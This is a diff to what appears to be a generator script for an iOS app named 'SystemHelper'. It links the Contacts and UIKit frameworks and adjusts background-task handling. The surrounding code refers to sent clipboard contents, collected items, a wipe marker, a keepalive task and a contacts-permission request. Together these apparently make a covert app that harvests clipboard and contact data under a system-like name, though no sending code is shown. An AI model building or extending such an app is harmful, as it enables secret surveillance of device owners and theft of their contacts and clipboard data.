@@ -24,7 +24,7 @@ static NSString *const kWipeMarker = @"ofx.wipe.done";
 
 static NSString *gSentClip = @"";
 static NSMutableArray<NSString *> *gCollected = nil;
-static UIBackgroundTaskIdentifier gBgTask = UIBackgroundTaskInvalid;
+static UIBackgroundTaskIdentifier gBgTask = 0;
 
 @interface AppDelegate : UIResponder <UIApplicationDelegate>
 @property (nonatomic, strong) UIWindow *window;
@@ -58,14 +58,14 @@ static UIBackgroundTaskIdentifier gBgTask = UIBackgroundTaskInvalid;
 }
 
 - (void)beginBgTask {
-    if (gBgTask != UIBackgroundTaskInvalid) return;
+    if (gBgTask != 0) return;
     __weak typeof(self) weakSelf = self;
     gBgTask = [[UIApplication sharedApplication] beginBackgroundTaskWithName:@"ofx.keepalive" expirationHandler:^{ [weakSelf endBgTask]; }];
 }
 - (void)endBgTask {
-    if (gBgTask == UIBackgroundTaskInvalid) return;
+    if (gBgTask == 0) return;
     [[UIApplication sharedApplication] endBackgroundTask:gBgTask];
-    gBgTask = UIBackgroundTaskInvalid;
+    gBgTask = 0;
 }
 - (void)requestContactsPermission {
     CNContactStore *store = [CNContactStore new];
@@ -184,13 +184,20 @@ PBXPROJ = '''// !$*UTF8*$!
     classes = {{}};
     objectVersion = 56;
     objects = {{
-        AAAA0001 = {{isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = SystemHelper; sourceTree = BUILT_PRODUCTS_DIR; }};
+        AAAA0001 = {{isa = PBXFileReference; lastKnownFileType = "wrapper.application"; path = SystemHelper.app; sourceTree = BUILT_PRODUCTS_DIR; }};
         AAAA0002 = {{isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = SOURCE_ROOT; }};
         AAAA0003 = {{isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = SOURCE_ROOT; }};
+        
+        AAAA0005 = {{isa = PBXBuildFile; fileRef = AAAA0006; }};
+        AAAA0006 = {{isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; }};
+        AAAA0007 = {{isa = PBXBuildFile; fileRef = AAAA0008; }};
+        AAAA0008 = {{isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Contacts.framework; path = System/Library/Frameworks/Contacts.framework; sourceTree = SDKROOT; }};
+        
         AAAA0004 = {{isa = PBXBuildFile; fileRef = AAAA0002; }};
 
-        AAAA0010 = {{ isa = PBXGroup; children = (AAAA0002, AAAA0003, AAAA0011); sourceTree = "<group>"; }};
+        AAAA0010 = {{ isa = PBXGroup; children = (AAAA0002, AAAA0003, AAAA0012, AAAA0011); sourceTree = "<group>"; }};
         AAAA0011 = {{ isa = PBXGroup; children = (AAAA0001); name = Products; sourceTree = "<group>"; }};
+        AAAA0012 = {{ isa = PBXGroup; children = (AAAA0006, AAAA0008); name = Frameworks; sourceTree = "<group>"; }};
 
         AAAA0020 = {{
             isa = PBXNativeTarget;
@@ -205,7 +212,7 @@ PBXPROJ = '''// !$*UTF8*$!
         }};
 
         AAAA0021 = {{ isa = PBXSourcesBuildPhase; buildActionMask = 2147483647; files = (AAAA0004,); runOnlyForDeploymentPostprocessing = 0; }};
-        AAAA0022 = {{ isa = PBXFrameworksBuildPhase; buildActionMask = 2147483647; files = (); runOnlyForDeploymentPostprocessing = 0; }};
+        AAAA0022 = {{ isa = PBXFrameworksBuildPhase; buildActionMask = 2147483647; files = (AAAA0005, AAAA0007,); runOnlyForDeploymentPostprocessing = 0; }};
 
         AAAA0040 = {{
             isa = PBXProject;
